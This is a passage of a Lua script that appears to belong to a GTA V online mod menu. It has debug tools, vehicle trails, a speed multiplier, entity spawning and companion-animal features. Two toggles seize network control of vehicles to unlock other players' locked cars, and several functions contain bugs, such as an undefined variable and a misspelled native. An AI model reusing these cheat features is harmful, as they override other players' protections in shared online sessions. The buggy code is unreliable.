menuToggleLoop(debugFeats, "Get V3 Of Entity", {"entcoords"}, "Toasts the coodinates of the entity you shoot.", function ()
    local pp = getLocalPed()
    if PED.IS_PED_SHOOTING(pp) then
        local pointer = memory.alloc(4)
        local found = PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), pointer)
        if found then
            local v3coords = getEntityCoords(memory.read_int(pointer))
            util.toast(v3coords.x .. " " .. v3coords.y .. " " .. v3coords.z)
        end
        memory.free(pointer)
    end
end)

menuAction(debugFeats, "Get Heading", {}, "", function ()
    local pp = getLocalPed()
    util.toast(ENTITY.GET_ENTITY_HEADING(pp))
end)

menuToggleLoop(debugFeats, "Get player name from shot", {}, "", function ()
    local pped = getPlayerPed(players.user())
    if PED.IS_PED_SHOOTING(pped) then
        local playerPointer = memory.alloc(4)
        local isEntFound = PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), playerPointer)
        if isEntFound then
            util.toast("Entity found!")
            local playerHandle = memory.read_int(playerPointer)
            if ENTITY.IS_ENTITY_A_PED(playerHandle) then
                util.toast("Is a ped!")
                util.toast(tostring(playerHandle))
                if PED.IS_PED_A_PLAYER(playerHandle) then
                    util.toast("Is a player!")
                    local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(playerHandle)
                    util.toast(playerID .. " is their playerID!")
                    local playerName = NETWORK.NETWORK_PLAYER_GET_NAME(playerID)
                    util.toast(playerName .. " is their name!")
                end
            end
        end
    end
end)

local ptfx_trails_list = vehh:list("PTFX Trails")

local PTFX_trails = {
    {name = "scr_mich4_firework_trail_spawn", asset = "scr_rcpaparazzo1", particle = "scr_mich4_firework_trail_spawn"},
    {name = "scr_mich4_firework_sparkle_spawn", asset = "scr_rcpaparazzo1", particle = "scr_mich4_firework_sparkle_spawn"},
    {name = "proj_flare_trail", asset = "core", particle = "proj_flare_trail"},
    {name = "trail_splash_oil", asset = "core", particle = "trail_splash_oil"},
    {name = "veh_trailer_petrol_spray", asset = "core", particle = "veh_trailer_petrol_spray"},
    {name = "trail_splash_blood", asset = "core", particle = "trail_splash_blood"},
    {name = "sp_fbi_fire_drip_trails", asset = "core", particle = "sp_fbi_fire_drip_trails"},
    {name = "trail_splash_water", asset = "core", particle = "trail_splash_water"},
    {name = "proj_rpg_trail", asset = "core", particle = "proj_rpg_trail"},
    {name = "scr_sum2_hal_rider_weak_blue", asset = "scr_rcpaparazzo1", particle = "scr_sum2_hal_rider_weak_blue"},
}

local ptfx_trails = {}
local particle_fx = {}
local time_delay = 0
for i, data in PTFX_trails do
    ptfx_trails[i] = ptfx_trails_list:toggle_loop(data.name, {}, "", function()
        if is_ped_in_any_vehicle(players.user_ped(), false) then
            local vehicle = entities.get_user_vehicle_as_handle(false)
            local height = func.get_model_dimensions_from_hash(get_entity_model(vehicle))
            local posX1 = -height.x/3 
            local posX2 = height.x/3 
            local posY = -height.y/3
            for i, posX in {posX1, posX2} do
                func.use_fx_asset(data.asset)
                local fx = start_networked_particle_fx_looped_on_entity(data.particle, vehicle, posX, posY, 0.0, 0.0, 0.0, 0.0, 0.6, false, false, false, 0, 0, 0, 0)
                table.insert(particle_fx, fx)
            end
            if time_delay >= 40 then
                for i, fx in particle_fx do
	    	        stop_particle_fx_looped(fx, false)
	    	        remove_particle_fx(fx, false)
	            end
                time_delay = 0
            end
            time_delay = time_delay + 1
        else
            util.toast("Your not in any vehicle.")
            for j = 1, #ptfx_trails do
                if ptfx_trails[j] == ptfx_trails[i] then
                    ptfx_trails[j].value = false
                end
            end
        end
    end, function()
        remove_named_ptfx_asset(data.asset)
	    for i, fx in particle_fx do
	    	stop_particle_fx_looped(fx, false)
	    	remove_particle_fx(fx, false)
	    end
    end)
end

--------------------------------------------------------------------------------------------------------------------------

vehh:toggle_loop("Unlock Vehicle that you shoot", {"unlockvehshot"}, "Unlocks a vehicle that you shoot. This will work on locked player cars.", function ()
    ::start::
    local localPed = getLocalPed()
    if PED.IS_PED_SHOOTING(localPed) then
        local pointer = memory.alloc(4)
        local isEntFound = PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), pointer)
        if isEntFound then
            local entity = memory.read_int(pointer)
            if ENTITY.IS_ENTITY_A_PED(entity) and PED.IS_PED_IN_ANY_VEHICLE(entity) then
                local vehicle = PED.GET_VEHICLE_PED_IS_IN(entity)
                ---------------------------------------------
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
                    for i = 1, 20 do
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
                        wait(100)
                    end
                end
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
                    util.toast("Waited 2 secs, couldn't get control!")
                    goto start
                else
                    util.toast("Has control.")
                end
                VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)
                VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
                VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(vehicle, players.user(), false)
            elseif ENTITY.IS_ENTITY_A_VEHICLE(entity) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
                    for i = 1, 20 do
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
                        wait(100)
                    end
                end
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
                    util.toast("Waited 2 secs, couldn't get control!")
                    goto start
                else
                    if SE_Notifications then
                        util.toast("Has control.")
                    end
                end
                VEHICLE.SET_VEHICLE_DOORS_LOCKED(entity, 1)
                VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(entity, false)
                VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(entity, players.user(), false)
                VEHICLE.SET_VEHICLE_HAS_BEEN_OWNED_BY_PLAYER(veh, false)
            end
        end
    end
end)

vehh:toggle_loop("Unlock vehicle that you try to get into", {"unlockvehget"}, "Unlocks a vehicle that you try to get into. This will work on locked player cars.", function ()
    ::start::
    local localPed = getLocalPed()
    local veh = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(localPed)
    if PED.IS_PED_IN_ANY_VEHICLE(localPed, false) then
        local v = PED.GET_VEHICLE_PED_IS_IN(localPed, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED(v, 1)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(v, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(v, players.user(), false)
        wait()
    else
        if veh ~= 0 then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
                for i = 1, 20 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    wait(100)
                end
            end
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
                util.toast("Waited 2 secs, couldn't get control!")
                goto start
            else
                if SE_Notifications then
                    util.toast("Has control.")
                end
            end
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(veh, 1)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(veh, false)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(veh, players.user(), false)
            VEHICLE.SET_VEHICLE_HAS_BEEN_OWNED_BY_PLAYER(veh, false)
        end
    end
end)

vehh:toggle_loop("Turn Car On Instantly", {"turnvehonget"}, "Turns the car engine on instantly when you get into it, so you don't have to wait.", function ()
    local localped = getLocalPed()
    if PED.IS_PED_GETTING_INTO_A_VEHICLE(localped) then
        local veh = PED.GET_VEHICLE_PED_IS_ENTERING(localped)
        if not VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(veh) then
            VEHICLE.SET_VEHICLE_FIXED(veh)
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(veh, 1000)
            VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, false)
        end
        if VEHICLE.GET_VEHICLE_CLASS(veh) == 15 then
            VEHICLE.SET_HELI_BLADES_FULL_SPEED(veh)
        end
    end
end)

vehh:toggle_loop("Stop Vehicle On Getting In", {"stopvehonget"}, "Set's the car's velocity to 0 when you try to get into it. Useful on roads.", function ()
    local localped = getLocalPed()
    if PED.IS_PED_GETTING_INTO_A_VEHICLE(localped) then
        local veh = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(localped)
        if not VEHICLE.IS_VEHICLE_STOPPED(veh) then
            ENTITY.FREEZE_ENTITY_POSITION(veh, true)
            ENTITY.SET_ENTITY_VELOCITY(veh, 0, 0, 0)
            ENTITY.FREEZE_ENTITY_POSITION(veh, false)
        end
    end
end)

local velmod = vehh:list("Velocity Multiplier")

SuperVehMultiply = 1.2

BetterSuperDrive = false
velmod:toggle("Velocity Multiplier (BIND TO HOLD)", {"vehmultiply"}, "Velocity multiplier for when you are in a vehicle.", function (superd)
    if superd then
        local localped = getLocalPed()
        BetterSuperDrive = true
        util.create_thread(function()
            while BetterSuperDrive do
                if PED.IS_PED_IN_ANY_VEHICLE(localped, false) then
                        local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
                        local vehVel = ENTITY.GET_ENTITY_VELOCITY(veh)
                        local newVel = {x = vehVel.x * SuperVehMultiply, y = vehVel.y * SuperVehMultiply, z = vehVel.z * SuperVehMultiply}
                        ENTITY.SET_ENTITY_VELOCITY(veh, newVel.x, newVel.y, newVel.z)
                        wait(100)
                    --end
                end
                wait()
            end
        end)
    else
        BetterSuperDrive = false
    end
end)

velmod:toggle("Velocity Multiplier (Bound To Shift)", {"vehmultiplyshift"}, "Velocity multiplier for when you are in a vehicle. Already bound to LSHIFT for shift enjoyers.", function (superd)
    if superd then
        local localped = getLocalPed()
        BetterSuperDrive = true
        util.create_thread(function()
            while BetterSuperDrive do
                if PED.IS_PED_IN_ANY_VEHICLE(localped, false) then
                    if PAD.IS_CONTROL_PRESSED(0, 21) then 
                        local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
                        local vehVel = ENTITY.GET_ENTITY_VELOCITY(veh)
                        local newVel = {x = vehVel.x * SuperVehMultiply, y = vehVel.y * SuperVehMultiply, z = vehVel.z * SuperVehMultiply}
                        ENTITY.SET_ENTITY_VELOCITY(veh, newVel.x, newVel.y, newVel.z)
                        wait(100)
                    end
                end
                wait()
            end
        end)
    else
        BetterSuperDrive = false
    end
end)

velmod:slider("Velocity Multiplier Multiplier (/100)", {"vehmultnum"}, "Divide by 100.", 1, 1000, 120, 10, function(val)
    SuperVehMultiply = val/100
end)

HAVE_SPAWN_FEATURES_BEEN_GENERATED = false
SPAWN_FROZEN = false
SPAWN_GOD = false
local spawnFeats = menu.list(debugFeats, "Spawn Features", {}, "")

function GenerateSpawnFeatures()
    if not HAVE_SPAWN_FEATURES_BEEN_GENERATED then
        HAVE_SPAWN_FEATURES_BEEN_GENERATED = true
        menu.divider(spawnFeats, "---------------------------------------")
        
        local spawnPeds = menu.list(spawnFeats, "Peds", {}, "")
        SPAWNED_PEDS = {}
        SPAWNED_PEDS_COUNT = 0
        local timeBeforePeds = util.current_time_millis()
        menu.action(spawnPeds, "Cleanup all spawned peds", {"cleanpeds"}, "Deletes all peds that you have spawned.", function()
            if SPAWNED_PEDS_COUNT ~= 0 then
                for i = 1, SPAWNED_PEDS_COUNT do
                    entities.delete_by_handle(SPAWNED_PEDS[i])
                end
                SPAWNED_PEDS_COUNT = 0
                SPAWNED_PEDS = {}
            else
                util.toast("No peds left!")
            end
        end)
        menu.divider(spawnPeds, "Spawns")
        for i = 1, #UNIVERSAL_PEDS_LIST do
            menu.action(spawnPeds, "Spawn " .. tostring(UNIVERSAL_PEDS_LIST[i]), {"catspawnped " .. tostring(UNIVERSAL_PEDS_LIST[i])}, "", function()
                SPAWNED_PEDS_COUNT = SPAWNED_PEDS_COUNT + 1
                SPAWNED_PEDS[SPAWNED_PEDS_COUNT] = spawnPedOnPlayer(util.joaat(UNIVERSAL_PEDS_LIST[i]), players.user())
                if SPAWN_FROZEN then
                    ENTITY.FREEZE_ENTITY_POSITION(SPAWNED_PEDS[SPAWNED_PEDS_COUNT], true)
                end
                if SPAWN_GOD then
                    ENTITY.SET_ENTITY_INVINCIBLE(SPAWNED_PEDS[SPAWNED_PEDS_COUNT], true)
                end
            end)
            if i % 32 == 0 then
                wait()
            end
        end
        local timeAfterPeds = util.current_time_millis()

        util.toast("It took about " .. timeAfterPeds - timeBeforePeds .. " milliseconds to generate ped spawn features!")
        ----------------------------------------------------------------------------

        local spawnObjs = menu.list(spawnFeats, "Objects", {}, "")
        SPAWNED_OBJS = {}
        SPAWNED_OBJ_COUNT = 0
        local timeBeforeObjs = util.current_time_millis()
        menu.action(spawnObjs, "Cleanup all spawned objects", {"cleanobjs"}, "Deletes all objects that you have spawned.", function()
            if SPAWNED_OBJ_COUNT ~= 0 then
                for i = 1, SPAWNED_OBJ_COUNT do
                    entities.delete_by_handle(SPAWNED_OBJS[i])
                end
                SPAWNED_OBJS = {}
                SPAWNED_OBJ_COUNT = 0
            else
                util.toast("No objects left!")
            end
        end)
        for i = 1, #UNIVERSAL_OBJECTS_LIST do
            menu.action(spawnObjs, "Spawn " .. tostring(UNIVERSAL_OBJECTS_LIST[i]), {"catspawnobj " .. tostring(UNIVERSAL_OBJECTS_LIST[i])}, "", function ()
                SPAWNED_OBJ_COUNT = SPAWNED_OBJ_COUNT + 1
                SPAWNED_OBJS[SPAWNED_OBJ_COUNT] = spawnObjectOnPlayer(util.joaat(tostring(UNIVERSAL_OBJECTS_LIST[i])), players.user())
                if SPAWN_FROZEN then
                    ENTITY.FREEZE_ENTITY_POSITION(SPAWNED_OBJS[SPAWNED_OBJ_COUNT], true)
                end
                if SPAWN_GOD then
                    ENTITY.SET_ENTITY_INVINCIBLE(SPAWNED_OBJS[SPAWNED_OBJ_COUNT], true)
                end
            end)
            if i % 100 == 0 then
                wait()
            end
        end
        local timeAfterObjs = util.current_time_millis()

        menu.toggle(spawnFeats, "Spawn freezed", {}, "This will spawn the peds/objects frozen in place.", function(on)
            SPAWN_FROZEN = on
        end)
        menu.toggle(spawnFeats, "Spawn Godmode", {}, "This will spawn the peds/objects unable to take damage.", function(on)
            SPAWN_GOD = on
        end)
    else
        util.toast("Spawn features already have been generated!")
    end
end

menuAction(spawnFeats, "Generate spawn features", {}, "Generates the spawn features. This is not done automatically due to it taking time/causing lag.", function()
    GenerateSpawnFeatures()
end)


--------------------------------------------------------------------------------------------------------------------------

local function request_control_of_entity(vehicle)
    if not util.is_session_started() then 
        return 
    end
    local ctr = 0
    local migrate_ctr = 0
    if vehicle != 0 then
        if not entities.get_can_migrate(vehicle) then
            repeat
                if migrate_ctr >= 250 then
                    ctr = 0
                    return
                end
                entities.set_can_migrate(vehicle, true)
                migrate_ctr +=1 
                util.yield()
            until entities.get_can_migrate(vehicle)
            migrate_ctr = 0
        end

        while not NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) do
            if ctr >= 250 then
                ctr = 0
                return
            end
            NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
            util.yield()
            ctr += 1
        end
    end
end


local function request_anim_dict(dict)
    while not HAS_ANIM_DICT_LOADED(dict) do
        REQUEST_ANIM_DICT(dict)
        util.yield()
    end
end

local function request_anim_set(set)
    while not HAS_ANIM_SET_LOADED(set) do
        STREQUEST_ANIM_SET(set)
        util.yield()
    end
end

function play_anim(ped, dict, name, duration)
    while not HAS_ANIM_DICT_LOADED(dict) do
        REQUEST_ANIM_DICT(dict)
        util.yield()
    end
    TASK_PLAY_ANIM(ped, dict, name, 1.0, 1.0, duration, 3, 0.5, false, false, false)
end

---------------------------------------

local pedfeats = menu.list(menuroot, "Peds", {}, "")

local DUKE_ROOT = menu.list(pedfeats, "Duke")


local skin_folders = {'A_C_MtLion_02', 'A_C_Boar_02', 'A_C_Coyote_02', 'A_C_Pug_02', 'A_C_Deer_02'}

local duke = false
local duke_blip = nil
local duke_ped = nil
local duke_mdl_hash = util.joaat("A_C_MtLion_02")
local duke_call_req = false
local duke_vehicle = 0

util.create_tick_handler(function()
    if duke then
        if duke_ped == nil or not DOES_ENTITY_EXIST(duke_ped) or GET_ENTITY_HEALTH(duke_ped) <= 50.0 then 
            if duke_blip ~= nil then 
                util.remove_blip(duke_blip)
            end
            util.request_model(duke_mdl_hash, 2000)
            duke_ped = entities.create_ped(28, duke_mdl_hash, players.get_position(players.user()), math.random(270))
            SET_ENTITY_INVINCIBLE(duke_ped, true)
            SET_PED_CAN_BE_DRAGGED_OUT(duke_ped, false)
            SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(duke_ped, 1)
            SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(duke_ped, true)
            SET_PED_CAN_RAGDOLL(duke_ped, false)    
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(duke_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
            duke_blip = ADD_BLIP_FOR_ENTITY(duke_ped)
            SET_BLIP_COLOUR(duke_blip, 57)
        end
        

        if entities.get_owner(duke_ped) ~= players.user() then 
            request_control_of_entity(duke_ped)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(duke_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
        end

        if duke_call_req then
            CLEAR_PED_TASKS_IMMEDIATELY(duke_ped)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(duke_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
            duke_call_req = false
        end

        local cur_car = entities.get_user_vehicle_as_handle(false)
        if duke_vehicle ~= cur_car then 
            if cur_car == -1 then
                CLEAR_PED_TASKS_IMMEDIATELY(duke_ped)
                TASK_FOLLOW_TO_OFFSET_OF_ENTITY(duke_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
                duke_vehicle = -1
            else
                if IS_VEHICLE_SEAT_FREE(cur_car, 0, false) then
                    SET_PED_INTO_VEHICLE(duke_ped, cur_car, 0)
                    play_anim(duke_ped, "misschop_vehicle@back_of_van", "chop_sit_loop", -1)
                    duke_vehicle = cur_car
                else
                    if IS_VEHICLE_SEAT_FREE(cur_car, 1, false) then
                        SET_PED_INTO_VEHICLE(duke_ped, cur_car, 1)
                        play_anim(duke_ped, "misschop_vehicle@back_of_van", "chop_sit_loop", -1)
                        duke_vehicle = cur_car
                    else
                        if IS_VEHICLE_SEAT_FREE(cur_car, 2, false) then
                            SET_PED_INTO_VEHICLE(duke_ped, cur_car, 2)
                            play_anim(duke_ped, "misschop_vehicle@back_of_van", "chop_sit_loop", -1)
                            duke_vehicle = cur_car
                end
            end
        end
    end
end

        
        local duke_pos =  v3.new(GET_ENTITY_COORDS(duke_ped))
        local player_pos = v3.new(players.get_position(players.user()))
        if v3.distance(duke_pos, player_pos) > 100 then 
            SET_ENTITY_COORDS(duke_ped, player_pos.x, player_pos.y, player_pos.z)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(duke_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
        end
    else
        if duke_ped ~= nil then 
            entities.delete(duke_ped)
            duke_ped = nil
            end
        end
    end)
--end)

local duketoggle = DUKE_ROOT:toggle('Duke', {}, 'Duke ', function(on)
    duke = on
end, false)

local calldebug DUKE_ROOT:action('Call/debug Duke', {}, 'This also clears all of Duke\'s current tasks, so if he gets bugged this should fix it.', function(on)
    duke_call_req = true
    util.toast("Duke should be called successfully!")
end)

--------------------------------------------------------------------------------------------------------------------------

local MILKIE_ROOT = menu.list(pedfeats, "Milkie")

local milkie = false
local milkie_blip = nil
local milkie_ped = nil
local milkie_mdl_hash = util.joaat("A_C_Cow")
local milkie_call_req = false
local milkie_vehicle = 0

util.create_tick_handler(function()
    if milkie then
        if milkie_ped == nil or not DOES_ENTITY_EXIST(milkie_ped) or GET_ENTITY_HEALTH(milkie_ped) <= 50.0 then 
            if milkie_blip ~= nil then 
                util.remove_blip(milkie_blip)
            end
            util.request_model(milkie_mdl_hash, 2000)
            milkie_ped = entities.create_ped(28, milkie_mdl_hash, players.get_position(players.user()), math.random(270))
            SET_ENTITY_INVINCIBLE(milkie_ped, true)
            SET_PED_CAN_BE_DRAGGED_OUT(milkie_ped, false)
            SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(milkie_ped, 1)
            SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(milkie_ped, true)
            SET_PED_CAN_RAGDOLL(milkie_ped, false)    
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(milkie_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
            milkie_blip = ADD_BLIP_FOR_ENTITY(milkie_ped)
            SET_BLIP_COLOUR(milkie_blip, 57)
        end
        

        if entities.get_owner(milkie_ped) ~= players.user() then 
            request_control_of_entity(milkie_ped)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(milkie_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
        end

        if milkie_call_req then
            CLEAR_PED_TASKS_IMMEDIATELY(milkie_ped)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(milkie_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
            milkie_call_req = false
        end

        local cur_car = entities.get_user_vehicle_as_handle(false)
        if milkie_vehicle ~= cur_car then 
            if cur_car == -1 then
                CLEAR_PED_TASKS_IMMEDIATELY(milkie_ped)
                TASK_FOLLOW_TO_OFFSET_OF_ENTITY(milkie_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
                milkie_vehicle = -1
            else
                if IS_VEHICLE_SEAT_FREE(cur_car, 0, false) then
                    SET_PED_INTO_VEHICLE(milkie_ped, cur_car, 0)
                    play_anim(milkie_ped, "missrat_vehicle@back_of_van", "rat_sit_loop", -1)
                    milkie_vehicle = cur_car
                else
                    if IS_VEHICLE_SEAT_FREE(cur_car, 1, false) then
                        SET_PED_INTO_VEHICLE(milkie_ped, cur_car, 1)
                        play_anim(milkie_ped, "missrat_vehicle@back_of_van", "rat_sit_loop", -1)
                        milkie_vehicle = cur_car
                    else
                        if IS_VEHICLE_SEAT_FREE(cur_car, 2, false) then
                            SET_PED_INTO_VEHICLE(milkie_ped, cur_car, 2)
                            play_anim(milkie_ped, "missrat_vehicle@back_of_van", "rat_sit_loop", -1)
                            milkie_vehicle = cur_car
                end
            end
        end
    end
end

        
        local milkie_pos =  v3.new(GET_ENTITY_COORDS(milkie_ped))
        local player_pos = v3.new(players.get_position(players.user()))
        if v3.distance(milkie_pos, player_pos) > 100 then 
            SET_ENTITY_COORDS(milkie_ped, player_pos.x, player_pos.y, player_pos.z)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(milkie_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
        end
    else
        if milkie_ped ~= nil then 
            entities.delete(milkie_ped)
            milkie_ped = nil
            end
        end
    end)

local milkietoggle = MILKIE_ROOT:toggle('Milkie', {}, '', function(on)
    milkie = on
end, false)

MILKIE_ROOT:action('Call/debug Milkie', {}, 'This also clears all of milkie\'s current tasks, so if he gets bugged this should fix it.', function(on)
    milkie_call_req = true
    util.toast("milkie should be called successfully!")
end)

--------------------------------------------------------------------------------------------------------------------------

local chop_ROOT = menu.list(pedfeats, "Chop")

local chop = false
local chop_blip = nil
local chop_ped = nil
local chop_mdl_hash = util.joaat("A_C_Chop")
local chop_call_req = false
local chop_vehicle = 0

util.create_tick_handler(function()
    if chop then
        if chop_ped == nil or not DOES_ENTITY_EXIST(chop_ped) or GET_ENTITY_HEALTH(chop_ped) <= 50.0 then 
            if chop_blip ~= nil then 
                util.remove_blip(chop_blip)
            end
            util.request_model(chop_mdl_hash, 2000)
            chop_ped = entities.create_ped(28, chop_mdl_hash, players.get_position(players.user()), math.random(270))
            SET_ENTITY_INVINCIBLE(chop_ped, true)
            SET_PED_CAN_BE_DRAGGED_OUT(chop_ped, false)
            SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(chop_ped, 1)
            SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(chop_ped, true)
            SET_PED_CAN_RAGDOLL(chop_ped, false)    
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(chop_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
            chop_blip = ADD_BLIP_FOR_ENTITY(chop_ped)
            SET_BLIP_COLOUR(chop_blip, 57)
        end
        

        if entities.get_owner(chop_ped) ~= players.user() then 
            request_control_of_entity(chop_ped)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(chop_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
        end

        if chop_call_req then
            CLEAR_PED_TASKS_IMMEDIATELY(chop_ped)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(chop_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
            chop_call_req = false
        end

        local cur_car = entities.get_user_vehicle_as_handle(false)
        if chop_vehicle ~= cur_car then 
            if cur_car == -1 then
                CLEAR_PED_TASKS_IMMEDIATELY(chop_ped)
                TASK_FOLLOW_TO_OFFSET_OF_ENTITY(chop_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
                chop_vehicle = -1
            else
                if IS_VEHICLE_SEAT_FREE(cur_car, 0, false) then
                    SET_PED_INTO_VEHICLE(chop_ped, cur_car, 0)
                    play_anim(chop_ped, "misschop_vehicle@back_of_van", "chop_sit_loop", -1)
                    chop_vehicle = cur_car
                else
                    if IS_VEHICLE_SEAT_FREE(cur_car, 1, false) then
                        SET_PED_INTO_VEHICLE(chop_ped, cur_car, 1)
                        play_anim(chop_ped, "misschop_vehicle@back_of_van", "chop_sit_loop", -1)
                        chop_vehicle = cur_car
                    else
                        if IS_VEHICLE_SEAT_FREE(cur_car, 2, false) then
                            SET_PED_INTO_VEHICLE(chop_ped, cur_car, 2)
                            play_anim(chop_ped, "misschop_vehicle@back_of_van", "chop_sit_loop", -1)
                            chop_vehicle = cur_car
                end
            end
        end
    end
end

        
        local chop_pos =  v3.new(GET_ENTITY_COORDS(chop_ped))
        local player_pos = v3.new(players.get_position(players.user()))
        if v3.distance(chop_pos, player_pos) > 100 then 
            SET_ENTITY_COORDS(chop_ped, player_pos.x, player_pos.y, player_pos.z)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(chop_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
        end
    else
        if chop_ped ~= nil then 
            entities.delete(chop_ped)
            chop_ped = nil
            end
        end
    end)
--end)

local choptoggle = chop_ROOT:toggle('chop', {}, '', function(on)
    chop = on
end, false)

chop_ROOT:action('Call/debug chop', {}, 'This also clears all of chop\'s current tasks, so if he gets bugged this should fix it.', function(on)
    chop_call_req = true
    util.toast("chop should be called successfully!")
end)

--------------------------------------------------------------------------------------------------------------------------

local rhesus_ROOT = menu.list(pedfeats, "Rhesus")

local rhesus = false
local rhesus_blip = nil
local rhesus_ped = nil
local rhesus_mdl_hash = util.joaat("A_C_Rhesus")
local rhesus_call_req = false
local rhesus_vehicle = 0

util.create_tick_handler(function()
    if rhesus then
        if rhesus_ped == nil or not DOES_ENTITY_EXIST(rhesus_ped) or GET_ENTITY_HEALTH(rhesus_ped) <= 50.0 then 
            if rhesus_blip ~= nil then 
                util.remove_blip(rhesus_blip)
            end
            util.request_model(rhesus_mdl_hash, 2000)
            rhesus_ped = entities.create_ped(28, rhesus_mdl_hash, players.get_position(players.user()), math.random(270))
            SET_ENTITY_INVINCIBLE(rhesus_ped, true)
            SET_PED_CAN_BE_DRAGGED_OUT(rhesus_ped, false)
            SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(rhesus_ped, 1)
            SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(rhesus_ped, true)
            SET_PED_CAN_RAGDOLL(rhesus_ped, false)    
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(rhesus_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
            rhesus_blip = ADD_BLIP_FOR_ENTITY(rhesus_ped)
            SET_BLIP_COLOUR(rhesus_blip, 57)
        end
        

        if entities.get_owner(rhesus_ped) ~= players.user() then 
            request_control_of_entity(rhesus_ped)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(rhesus_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
        end

        if rhesus_call_req then
            CLEAR_PED_TASKS_IMMEDIATELY(rhesus_ped)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(rhesus_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
            rhesus_call_req = false
        end

        local cur_car = entities.get_user_vehicle_as_handle(false)
        if rhesus_vehicle ~= cur_car then 
            if cur_car == -1 then
                CLEAR_PED_TASKS_IMMEDIATELY(rhesus_ped)
                TASK_FOLLOW_TO_OFFSET_OF_ENTITY(rhesus_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
                rhesus_vehicle = -1
            else
                if IS_VEHICLE_SEAT_FREE(cur_car, 0, false) then
                    SET_PED_INTO_VEHICLE(rhesus_ped, cur_car, 0)
                    rhesus_vehicle = cur_car
                else
                    if IS_VEHICLE_SEAT_FREE(cur_car, 1, false) then
                        SET_PED_INTO_VEHICLE(rhesus_ped, cur_car, 1)
                        rhesus_vehicle = cur_car
                    else
                        if IS_VEHICLE_SEAT_FREE(cur_car, 2, false) then
                            SET_PED_INTO_VEHICLE(rhesus_ped, cur_car, 2)
                            rhesus_vehicle = cur_car
                end
            end
